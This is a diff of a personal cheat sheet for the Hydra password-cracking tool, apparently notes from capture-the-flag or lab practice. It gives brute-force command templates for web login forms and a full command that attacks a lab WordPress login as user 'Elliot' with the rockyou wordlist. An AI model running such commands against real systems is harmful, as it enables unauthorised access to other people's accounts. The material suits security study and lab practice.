@@ -42,9 +42,11 @@
 - -f = terminate if found
 - -s = port to connect
 - -t = number threadlos
+- hydra MODULE -U
+
 
 - web
-  - hydra -l USERNAME -P WORDLIST_FILEserver *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
+  - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[PATH_TO_LOGIN]:[body_request]:[F|S]=[ERROR_MESSAGE]"** -vV -f
     - F:failing strings
     - S:sucessfull strings
   - hydra -l USERNAME -P WORDLIST_FILE server *request-method* **"/[request]:username=^USER^&password=^PASS^:F=incorrect"** -v
@@ -59,6 +61,7 @@
       - -V Verbose
       - -f = stop attack after finding
       - -L = List of usernames
+      - -s=302 ==> sucessfull redirect
 
 ```
 hydra -l Elliot -P /usr/share/wordlists/rockyou.txt.gz $target http-post-form\n'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.134.131%2Fwp-admin%2F&testcookie=1:ERROR: The password you entered for the username elliot is incorrect. Lost your password?'  -f
